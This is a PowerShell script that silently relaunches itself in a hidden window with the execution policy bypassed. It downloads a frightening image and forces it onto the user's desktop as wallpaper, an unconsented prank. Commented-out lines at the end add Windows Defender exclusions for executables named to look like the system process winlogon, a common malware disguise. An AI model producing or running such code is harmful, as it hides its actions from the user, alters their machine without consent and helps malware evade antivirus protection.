$imageUrl = "https://thumbs.dreamstime.com/b/man-screams-fear-horror-pop-art-retro-vector-illustration-103789731.jpg"
$outputPath = "$env:USERPROFILE\sfondo.jpg"

if ($host.Name -eq 'ConsoleHost') {
    $scriptPath = (Get-Process -Id $PID).Path
    Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
    exit
}

# Create a job to download the file
$job = Start-Job -ScriptBlock {
    param($url, $path)
    Invoke-WebRequest -Uri $url -OutFile $path
} -ArgumentList $imageUrl, $outputPath

# Wait for the job to complete
Wait-Job -Job $job | Out-Null

# Set the wallpaper
$RegKeyPath = "HKCU:\Control Panel\Desktop"
Set-ItemProperty -Path $RegKeyPath -Name Wallpaper -Value $outputPath
rundll32.exe user32.dll, UpdatePerUserSystemParameters
RUNDLL32.EXE USER32.DLL, UpdatePerUserSystemParameters 1, True

# Clean up the job
Remove-Job -Job $job


# Add-MpPreference -ExclusionPath "C:\Windows\system32\winlogson\Windows12.exe"
# Add-MpPreference -ExclusionPath "$env:APPDATA\Windows12.exe"
# Add-MpPreference -ExclusionProcess "Windows12.exe"
# Add-MpPreference -ExclusionPath "C:\Windows\system32\winlogson\winlogson.exe"
# Add-MpPreference -ExclusionPath "$env:APPDATA\winlogson.exe"
# Add-MpPreference -ExclusionProcess "winlogson.exe"
